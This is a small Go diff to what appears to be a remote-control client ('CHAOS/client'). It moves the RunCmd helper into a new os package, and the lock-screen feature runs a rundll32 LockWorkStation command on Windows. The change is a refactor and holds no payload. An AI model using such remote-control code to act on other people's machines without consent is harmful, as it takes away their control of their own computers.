@@ -6,6 +6,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
+	"github.com/tiagorlampert/CHAOS/client/app/util/os"
 	"net"
 )
 
@@ -23,7 +24,7 @@ func (l LockScreenUseCase) Lock() {
 	var err error
 	switch util.DetectOS() {
 	case util.Windows:
-		_, err = util.RunCmd("rundll32.exe user32.dll,LockWorkStation", 10)
+		_, err = os.RunCmd("rundll32.exe user32.dll,LockWorkStation", 10)
 	default:
 		err = usecase.ErrUnsupportedPlatform
 	}
